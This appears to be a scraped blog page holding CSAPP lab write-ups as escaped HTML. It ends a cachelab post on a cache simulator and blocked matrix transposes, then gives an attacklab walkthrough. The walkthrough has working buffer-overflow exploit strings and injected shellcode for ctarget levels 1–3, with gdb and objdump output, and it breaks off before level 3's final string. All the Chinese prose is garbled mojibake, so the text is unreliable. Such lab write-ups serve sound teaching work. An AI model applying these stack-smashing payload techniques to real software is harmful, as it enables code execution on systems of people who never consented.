            maxstemp = cache[access_set][i].LRU_stemp;
        }
    }
    //è¡Œæ›¿æ¢
    cache[access_set][eviction_line].valid = 1;
    cache[access_set][eviction_line].tag = access_tag;
    cache[access_set][eviction_line].LRU_stemp = stempnow++;
    misses++;
    evictions++;
    return EVICTION;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸ºäº†å®ç°LRUçš„æ›¿æ¢ç­–ç•¥ï¼Œæˆ‘çš„æ–¹æ³•æ˜¯ç»´æŒä¸€ä¸ªstempnowçš„è‡ªå»ºæ—¶é—´æˆ³ï¼Œæ¯æ¬¡å¯¹è¡Œæœ‰æ›´æ–°æ—¶å°±è®²è¿™ä¸ªæ—¶é—´æˆ³è®°å½•è¿›å»ï¼ŒåŒæ—¶æ—¶é—´æˆ³è‡ªåŠ 1ï¼Œè¿™æ ·æ›¿æ¢æ—¶å°±åªéœ€è¦å¯»æ‰¾æ—¶é—´æˆ³æœ€å°çš„é‚£ä¸€è¡Œæ›¿æ¢å°±è¡Œã€‚&lt;br&gt;
è¿™ä¸€éƒ¨åˆ†æ€»ä½“ä¸Šä¸éš¾ï¼Œä¸»è¦å›°éš¾åœ¨äºç†è§£cacheçš„å·¥ä½œæ–¹å¼å’Œè®¾è®¡å¦‚ä½•å»æå–å‡ºç»„å·ä¸tagå€¼ã€‚&lt;/p&gt;
&lt;h2 id=&#34;part-b&#34;&gt;Part B&lt;/h2&gt;
&lt;p&gt;è¿™ä¸€éƒ¨åˆ†éœ€è¦æˆ‘ä»¬å®ç°çŸ©é˜µçš„è½¬ç½®ï¼Œè¦æ±‚å°½å¯èƒ½åœ°åˆ©ç”¨cacheï¼Œå³å‡å°‘missï¼Œæ€»å…±æœ‰ä¸‰é“é¢˜ã€‚&lt;/p&gt;
&lt;h3 id=&#34;3232&#34;&gt;32*32&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬é¦–å…ˆçœ‹ä¸€ä¸‹ç¤ºä¾‹çš„è›®åŠ›æ³•&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_8db52d3dc29d6cd32b26b3a02bfc52b5.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
missé«˜è¾¾1183ï¼Œè¿œå¤§äº300çš„ç›®æ ‡ã€‚&lt;br&gt;
æˆ‘ä»¬çŸ¥é“çš„æ˜¯cache å¤§å°ä¸º s=5,E=1,b=5,å³32ç»„_1è¡Œ_32å­—èŠ‚ï¼Œå…±256ä¸ªintã€‚&lt;br&gt;
æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹çŸ©é˜µè¿›è¡Œåˆ†å—ï¼Œæˆ‘ä»¬åœ¨è½¬ç½®çš„è¿‡ç¨‹ä¸­å°½é‡è®©å—å°äºcacheå¤§å°ï¼Œå› ä¸ºcacheå¯ä»¥è£…256ä¸ªintï¼Œæ‰€ä»¥å—å¤§å°å®šä¸º8*8ã€‚&lt;br&gt;
ï¼ˆè¿™ä¸€æ­¥çš„ä»£ç æ²¡ä¿å­˜ï¼Œå°±ä¸è´´äº†ï¼‰&lt;br&gt;
ç»“æœæ˜¯&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_cbdf4366e62a6c8c3e7a4e59490e533c.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä»æ²¡è¾¾åˆ°è¦æ±‚ã€‚&lt;br&gt;
ä¸‹ä¸€æ­¥æˆ‘é€‰æ‹©æ¯æ¬¡æŠŠæ¯ä¸€è¡Œçš„8ä¸ªæ•°ä¸€æ¬¡æ€§è¯»å–ï¼Œç„¶åå†ä¸€æ¬¡æ€§å­˜åˆ°çŸ©é˜µBä¸­ï¼Œè¿™æ ·å¯ä»¥è¿›ä¸€æ­¥å‡å°‘cacheçš„æ›¿æ¢ï¼Œä»è€Œå‡å°‘missã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (M == 32)
    {
        int i, j, block_i;
        int t0, t1, t2, t3, t4, t5, t6, t7;
        for (i = 0; i &amp;lt; N; i += 8)
        {
            for (j = 0; j &amp;lt; M; j += 8)
            {
                for (block_i = 0; block_i &amp;lt; 8; block_i++)
                {
                    t0 = A[i + block_i][j + 0];
                    t1 = A[i + block_i][j + 1];
                    t2 = A[i + block_i][j + 2];
                    t3 = A[i + block_i][j + 3];
                    t4 = A[i + block_i][j + 4];
                    t5 = A[i + block_i][j + 5];
                    t6 = A[i + block_i][j + 6];
                    t7 = A[i + block_i][j + 7];
                    B[j + 0][i + block_i] = t0;
                    B[j + 1][i + block_i] = t1;
                    B[j + 2][i + block_i] = t2;
                    B[j + 3][i + block_i] = t3;
                    B[j + 4][i + block_i] = t4;
                    B[j + 5][i + block_i] = t5;
                    B[j + 6][i + block_i] = t6;
                    B[j + 7][i + block_i] = t7;
                }
            }
        }
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç»“æœæ˜¯&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_56c0dd079d3aca587e6d23ed1df3443d.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç»ˆäºé€šè¿‡äº†&lt;/p&gt;
&lt;h3 id=&#34;6464&#34;&gt;64*64&lt;/h3&gt;
&lt;p&gt;è¿™æ˜¯æœ€éš¾çš„ä¸€éƒ¨åˆ†ï¼Œå› ä¸ºæ•´ä¸ªcacheåªèƒ½å­˜å‚¨æ•°ç»„çš„å››è¡Œï¼Œæ‰€ä»¥å¦‚æœæŒ‰ç…§8_8åˆ†å—çš„è¯ä»ç„¶æœ‰å¾ˆé«˜çš„å†²çªï¼Œç„¶è€Œè¿™ä¸€é¢˜è¦æ±‚æœ‰ååˆ†ä¸¥è‹›ï¼Œåªèƒ½1300ï¼Œæ‰€ä»¥éœ€è¦æ›´ç²¾ç»†çš„æ–¹æ³•ï¼Œå…ˆæŒ‰ç…§8_8åˆ†å—ï¼Œåœ¨å—å†…åœ¨æŒ‰ç…§4*4åˆ’åˆ†ï¼ŒåŒæ—¶ä¸è¿½æ±‚ä¸€æ¬¡åˆ°ä½ï¼Œè€Œè¦æ±‚æœ€é«˜çš„cacheé‡å¤è®¿é—®ï¼Œè¯¦ç»†è§£æå¯ä»¥å‚è€ƒ&lt;a href=&#34;https://www.cnblogs.com/liqiuhao/p/8026100.html?utm_source=debugrun&amp;amp;utm_medium=referral&#34;&gt;è¿™ç¯‡åšå®¢&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;ä»£ç ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;else if (N == 64)
    {
        for (int i = 0; i &amp;lt; N; i += 8)
        {
            for (int j = 0; j &amp;lt; M; j += 8)
            {
                for (int k = i; k &amp;lt; i + 4; ++k)
                {
                    /* è¯»å–1 2ï¼Œæš‚æ—¶æ”¾åœ¨å·¦ä¸‹è§’1 2 */
                    int temp_value0 = A[k][j];
                    int temp_value1 = A[k][j + 1];
                    int temp_value2 = A[k][j + 2];
                    int temp_value3 = A[k][j + 3];
                    int temp_value4 = A[k][j + 4];
                    int temp_value5 = A[k][j + 5];
                    int temp_value6 = A[k][j + 6];
                    int temp_value7 = A[k][j + 7];

                    B[j][k] = temp_value0;
                    B[j + 1][k] = temp_value1;
                    B[j + 2][k] = temp_value2;
                    B[j + 3][k] = temp_value3;
                    /* é€†åºæ”¾ç½® */
                    B[j][k + 4] = temp_value7;
                    B[j + 1][k + 4] = temp_value6;
                    B[j + 2][k + 4] = temp_value5;
                    B[j + 3][k + 4] = temp_value4;
                }
                for (int l = 0; l &amp;lt; 4; ++l)
                {
                    /* æŒ‰åˆ—è¯»å– */
                    int temp_value0 = A[i + 4][j + 3 - l];
                    int temp_value1 = A[i + 5][j + 3 - l];
                    int temp_value2 = A[i + 6][j + 3 - l];
                    int temp_value3 = A[i + 7][j + 3 - l];
                    int temp_value4 = A[i + 4][j + 4 + l];
                    int temp_value5 = A[i + 5][j + 4 + l];
                    int temp_value6 = A[i + 6][j + 4 + l];
                    int temp_value7 = A[i + 7][j + 4 + l];

                    /* ä»ä¸‹å‘ä¸ŠæŒ‰è¡Œè½¬æ¢2åˆ°3 */
                    B[j + 4 + l][i] = B[j + 3 - l][i + 4];
                    B[j + 4 + l][i + 1] = B[j + 3 - l][i + 5];
                    B[j + 4 + l][i + 2] = B[j + 3 - l][i + 6];
                    B[j + 4 + l][i + 3] = B[j + 3 - l][i + 7];
                    /* å°†3 4æ”¾åˆ°æ­£ç¡®çš„ä½ç½® */
                    B[j + 3 - l][i + 4] = temp_value0;
                    B[j + 3 - l][i + 5] = temp_value1;
                    B[j + 3 - l][i + 6] = temp_value2;
                    B[j + 3 - l][i + 7] = temp_value3;
                    B[j + 4 + l][i + 4] = temp_value4;
                    B[j + 4 + l][i + 5] = temp_value5;
                    B[j + 4 + l][i + 6] = temp_value6;
                    B[j + 4 + l][i + 7] = temp_value7;
                }
            }
        }
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç»“æœ&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_ffb263a782f4a0423e7194043f170ae6.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åƒè¿™æ ·è¿›è¡Œä¸“é—¨çš„ä¼˜åŒ–ï¼Œç¡®å®å¯ä»¥æå¤§åœ°æé«˜cacheçš„åˆ©ç”¨ç‡ï¼Œä»è€Œæé«˜ç¨‹åºçš„æ•ˆç‡ï¼Œä½†æ˜¯å…¶ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œåªèƒ½é’ˆå¯¹ä¸“é—¨çš„çŸ©é˜µè¿›è¡Œä¼˜åŒ–ï¼Œä¸å…·æœ‰æ™®é€‚æ€§ï¼Œå°±åƒæˆ‘ä»¬å³å°†çœ‹åˆ°çš„ç¬¬ä¸‰é¢˜ã€‚&lt;/p&gt;
&lt;h3 id=&#34;6167&#34;&gt;61*67&lt;/h3&gt;
&lt;p&gt;è¿™ä¸€é¢˜ç”±äºçŸ©é˜µæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„è§„å¾‹ï¼Œæ‰€ä»¥ä¸æ¸…æ¥šåœ¨cacheçš„æ˜ å°„æƒ…å†µï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½ä¸€æ­¥æ­¥åœ°å°è¯•åˆ†å—çš„å¤§å°ï¼Œæœ€ç»ˆå‘ç°å¤§çº¦åœ¨14*14æ—¶å¯ä»¥æ»¡è¶³é¢˜ç›®è¦æ±‚ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;else
    { //æ²¡æœ‰ä»€ä¹ˆç‰¹å¾ï¼Œåªèƒ½è¯•å—å¤§å°ï¼Œåœ¨14çš„æ—¶å€™missesä¸º1996ï¼Œé€šè¿‡äº†
        int block_size = 14;
        int i, j, bl_i, bl_j;
        for (i = 0; i &amp;lt; N; i += block_size)
            for (j = 0; j &amp;lt; M; j += block_size)
                for (bl_i = 0; bl_i &amp;lt; block_size &amp;amp;&amp;amp; bl_i + i &amp;lt; N; bl_i++)
                    for (bl_j = 0; bl_j &amp;lt; block_size &amp;amp;&amp;amp; bl_j + j &amp;lt; M; bl_j++)
                        B[j + bl_j][i + bl_i] = A[i + bl_i][j + bl_j];
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;æ»¡åˆ†åˆå½±&#34;&gt;æ»¡åˆ†åˆå½±&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/_b4661e2b2a55344639f67be2127d2350.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;å®Œæ•´ä»£ç &#34;&gt;å®Œæ•´ä»£ç &lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://static.yulan.net.cn/image/csapp_cachelab_parta.c&#34;&gt;Part a&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://static.yulan.net.cn/image/csapp_cachelab_partb.c&#34;&gt;Part b&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
">CSAPP: cachelab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_ainkg2/"" data-c="
          &lt;p&gt;è¿™ä¸ªå®éªŒè¦æ±‚åœ¨5ä¸ªæœ‰ä¸åŒå®‰å…¨æ¼æ´çš„ä»£ç ä¸Šè¿›è¡Œæ”»å‡»(ä¸€å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯è¦ä¿®å¤æ¼æ´...)ï¼Œæ€»å…±æœ‰ä¸¤ç§æ”»å‡»æ–¹å¼ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Code Injection Attacksï¼ˆç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼‰&lt;/li&gt;
&lt;li&gt;Return-Oriented Programmingï¼ˆROPæ”»å‡»ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä»CSAPPç½‘ç«™ä¸‹è½½ä¸‹æ¥è§£å‹åä¸€å…±æœ‰äº”ä¸ªæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ctarget&lt;/code&gt;ï¼šä¸€ä¸ªå®¹æ˜“é­å—code injectionæ”»å‡»çš„å¯æ‰§è¡Œç¨‹åºã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rtarget&lt;/code&gt;ï¼šä¸€ä¸ªå®¹æ˜“é­å—return-oriented programmingæ”»å‡»çš„å¯æ‰§è¡Œç¨‹åºã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cookie.txt&lt;/code&gt;ï¼šä¸€ä¸ª8ä½çš„åå…­è¿›åˆ¶ç ï¼Œç”¨äºéªŒè¯èº«ä»½çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;farm.c&lt;/code&gt;ï¼šç›®æ ‡â€œgadget farmâ€çš„æºä»£ç ï¼Œç”¨äºäº§ç”Ÿreturn-oriented programmingæ”»å‡»ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hex2raw&lt;/code&gt;ï¼šä¸€ä¸ªç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²çš„å·¥å…·ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å®éªŒä¹‹å‰ä¸€å®šè¦é˜…è¯»&lt;a href=&#34;http://csapp.cs.cmu.edu/3e/attacklab.pdf&#34;&gt;æŒ‡å¯¼æ‰‹å†Œ&lt;/a&gt;ï¼Œè¿˜æœ‰&lt;a href=&#34;http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf&#34;&gt;GDBæŒ‡å—&lt;/a&gt;ï¼Œå¯¹å®éªŒå¾ˆæœ‰å¸®åŠ©ã€‚&lt;/p&gt;
&lt;h2 id=&#34;level1&#34;&gt;Level1&lt;/h2&gt;
&lt;p&gt;è¦æ±‚æˆ‘ä»¬è¾“å…¥ä¸€æ®µå­—ç¬¦ä¸²ï¼Œé€šè¿‡ç¼“å†²åŒºæº¢å‡ºæ”¹å˜å‡½æ•°çš„è¿”å›åœ°å€ï¼Œå®šå‘åˆ° &lt;code&gt;touch1&lt;/code&gt;Â å‡½æ•°&lt;br&gt;
é¦–å…ˆçœ‹çœ‹ &lt;code&gt;test&lt;/code&gt;Â å‡½æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000401968 &amp;lt;test&amp;gt;:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 &amp;lt;getbuf&amp;gt;
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 &amp;lt;__printf_chk@plt&amp;gt;
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«ä¹‹å¤„&lt;br&gt;
æˆ‘ä»¬å†çœ‹ä¸‹ &lt;code&gt;getbuf&lt;/code&gt;Â å‡½æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004017a8 &amp;lt;getbuf&amp;gt;:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 &amp;lt;Gets&amp;gt;
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é¦–å…ˆåˆ›å»ºä¸€ä¸ª 40 ä¸ªå­—èŠ‚çš„ç¼“å†²åŒº( &lt;code&gt;0x28=40&lt;/code&gt;Â )ï¼Œç„¶åé€šè¿‡Getså‡½æ•°è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²åˆ°ç¼“å†²åŒºã€‚&lt;br&gt;
æˆ‘ä»¬å…ˆæ¥æŸ¥çœ‹ä¸€ä¸‹stackçš„çŠ¶æ€ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/60b $rsp
0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°è·ç¦» &lt;code&gt;%rsp&lt;/code&gt; çš„ç¬¬41,42,43å­—èŠ‚å¤„æœ‰ä¸€ä¸ªå€¼ &lt;code&gt;761940&lt;/code&gt; ï¼ŒçŒœæµ‹è¿™æ˜¯ä¸€ä¸ªè¿”å›åœ°å€ï¼ŒCtrl+FæŸ¥æ‰¾&lt;br&gt;
ç„¶è€Œ&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_0da3636d63a59ddbf940c5191d99cf0e.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¿½ç„¶æƒ³èµ·å°ç«¯åºçš„é—®é¢˜ï¼Œæ‰€ä»¥è¿™ä¸ªåœ°å€åº”è¯¥æ˜¯ &lt;code&gt;401976&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_65725cc8a986fa6dbca8525ef2087c08.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å°±æ˜¯getbufå‡½æ•°åä¸€æ¡æŒ‡ä»¤çš„ä½ç½®ã€‚&lt;br&gt;
æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦é€šè¿‡ç¼“å†²åŒºæº¢å‡ºæ¥æ”¹å˜è¿™ä¸ªæŒ‡ä»¤åœ°å€å³å¯ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æŸ¥çœ‹touch1çš„åœ°å€&#34;&gt;æŸ¥çœ‹touch1çš„åœ°å€&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;00000000004017c0 &amp;lt;touch1&amp;gt;:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;æ„é€ æˆ‘ä»¬çš„è¾“å…¥å­—ç¬¦ä¸²&#34;&gt;æ„é€ æˆ‘ä»¬çš„è¾“å…¥å­—ç¬¦ä¸²&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 c0 17 40
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‰40ä½ä¸é‡è¦&lt;/p&gt;
&lt;h3 id=&#34;é€šè¿‡hex2rawç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²å¹¶æ‰§è¡Œ&#34;&gt;é€šè¿‡hex2rawç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²å¹¶æ‰§è¡Œ&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./hex2raw &amp;lt; exploit1.txt &amp;gt; exploit1-raw.txt
ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit1-raw.txt 
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 C0 17 40
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡ï¼ï¼ï¼&lt;/p&gt;
&lt;h2 id=&#34;level2&#34;&gt;Level2&lt;/h2&gt;
&lt;p&gt;è¿™ä¸€å…³è¦æˆ‘ä»¬ä»testè·³è½¬åˆ°å¦å¤–ä¸€ä¸ªå‡½æ•° &lt;code&gt;touch2&lt;/code&gt; ï¼ŒåŒæ—¶å°†æˆ‘ä»¬è‡ªå·±çš„cookieä½œä¸ºå‚æ•°ä¼ ç»™ &lt;code&gt;touch2&lt;/code&gt;Â ï¼Œè¿™ä¸ªå‚æ•°é»˜è®¤åº”è¯¥åœ¨%rdiä¸­ã€‚&lt;br&gt;
è¿™ä¸€å…³æˆ‘ä»¬ä¸ä»…è¦ä¿®æ”¹è·³è½¬åœ°å€ï¼Œè¿˜è¦æ’å…¥ä¸€æ®µä»£ç è¿›å»æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™æ®µä»£ç æ’åœ¨ç¼“å†²åŒºä¹‹ä¸­ï¼Œç„¶åå°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºæˆ‘ä»¬ä»£ç çš„åœ°å€ï¼Œå¹¶æˆ‘ä»¬çš„ä»£ç ä¸­åŠ å…¥retæŒ‡ä»¤ï¼Œä½¿ä»–æœ€åè¿”å›åˆ° &lt;code&gt;touch2&lt;/code&gt;Â çš„å…¥å£&lt;/p&gt;
&lt;h3 id=&#34;æˆ‘ä»¬éœ€è¦æ’å…¥çš„ä»£ç &#34;&gt;æˆ‘ä»¬éœ€è¦æ’å…¥çš„ä»£ç &lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;mov $0x59b997fa,%rdi
pushq $0x4017ec
retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¾ˆç®€å•ï¼Œåªç”¨å°†cookieä¿å­˜åˆ°%rdiï¼Œç„¶åé‡æ–°æŒ‡å®š &lt;code&gt;touch2&lt;/code&gt;Â çš„åœ°å€ä¸ºè¿”å›åœ°å€å³å¯&lt;br&gt;
ä½¿ç”¨gccä¸objdumpç”Ÿæˆæœºå™¨æŒ‡ä»¤&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ gcc -c asscode.s
ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o

asscode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;.text&amp;gt;:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŠŠæŒ‡ä»¤æ’åœ¨ç¼“å†²åŒº&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  78 dc 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å’Œlevel1ä¸€æ ·ï¼Œå‰é¢40ä¸ªå­—èŠ‚ï¼Œåé¢æ˜¯æˆ‘ä»¬æŒ‡å®šçš„è¿”å›åœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬è¦å°†ä»–æŒ‡å®šä¸ºæˆ‘ä»¬çš„ä»£ç æ’å…¥çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ç¼“å­˜åŒºçš„èµ·å§‹åœ°å€ã€‚&lt;/p&gt;
&lt;h4 id=&#34;é€šè¿‡gdbæŸ¥çœ‹repçš„å€¼&#34;&gt;é€šè¿‡gdbæŸ¥çœ‹%repçš„å€¼&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;(gdb) print $rsp
$2 = (void *) 0x5561dc78
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰€ä»¥æœ€åå››ä¸ªå­—èŠ‚åº”è¯¥æ˜¯ &lt;code&gt;78&lt;/code&gt;Â &lt;code&gt;dc&lt;/code&gt;Â &lt;code&gt;61&lt;/code&gt;Â &lt;code&gt;55&lt;/code&gt;&lt;br&gt;
æœ€åå’Œlevel1ä¸€æ ·æ‰§è¡Œ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit2-raw.txt 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;level3&#34;&gt;Level3&lt;/h2&gt;
&lt;p&gt;è¿™ä¸€å…³å’Œlevel2å·®ä¸å¤šï¼Œåªæ˜¯è¿™æ¬¡ä¼ çš„å‚æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå…¶å®å·®ä¸å¤šï¼Œæˆ‘ä»¬å…ˆæŠŠcookieå­˜åœ¨æ ˆé‡Œé¢ï¼Œç„¶åæŠŠåœ°å€ä¼ ç»™%rdiå³å¯ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_d13d42c5c8d72192ca39358968839d97.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¦æ³¨æ„å‡½æ•°hexmatchä¼šä½¿ç”¨æ ˆä¸Šçš„ç©ºé—´ï¼Œå¯èƒ½ä¼šè¦†ç›–æˆ‘ä»¬çš„cookie&lt;br&gt;
&lt;strong&gt;ä¸è¿‡æ²¡å…³ç³»ï¼Œ&lt;/strong&gt;&lt;code&gt;**sub 0x28 %rsp**&lt;/code&gt;**Â  ï¼Œå’±ç»™è‡ªå·±é€ ä¸ªæ ˆ**&lt;br&gt;
æ‰€ä»¥æˆ‘ä»¬åµŒå…¥çš„ä»£ç åº”è¯¥æ˜¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;movq $0x5561dc93,%rdi
sub $0x28,%rsp
pushq $0x4018fa
retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…¶ä¸­ç¬¬ä¸€æ­¥ä¼ ç»™%rdiçš„åœ°å€åº”è¯¥æ˜¯ä½ å­˜æ”¾cookieçš„åœ°å€ï¼Œä¸€å®šè¦æ•°æ¸…æ¥šï¼Œæˆ‘ä»¬è¿˜è¦æŠŠcookieä½¿ç”¨asciiç è½¬ä¹‰ï¼Œå¹¶åœ¨æœ«å°¾æ·»åŠ  &lt;code&gt;0x00&lt;/code&gt;Â è¡¨ç¤ºç»“æŸã€‚&lt;/p&gt;
&lt;h4 id=&#34;ç”Ÿæˆæœºå™¨ç &#34;&gt;ç”Ÿæˆæœºå™¨ç &lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o

asscode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;.text&amp;gt;:
   0:   48 c7 c7 93 dc 61 55    mov    $0x5561dc93,%rdi
   7:   48 83 ec 28             sub    $0x28,%rsp
   b:   68 fa 18 40 00          pushq  $0x4018fa
  10:   c3                      retq
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;æœ€ç»ˆå†™å‡ºå…¥ä¾µå­—ä¸²&#34;&gt;æœ€ç»ˆå†™å‡ºå…¥ä¾µå­—ä¸²&lt;/h3&gt;
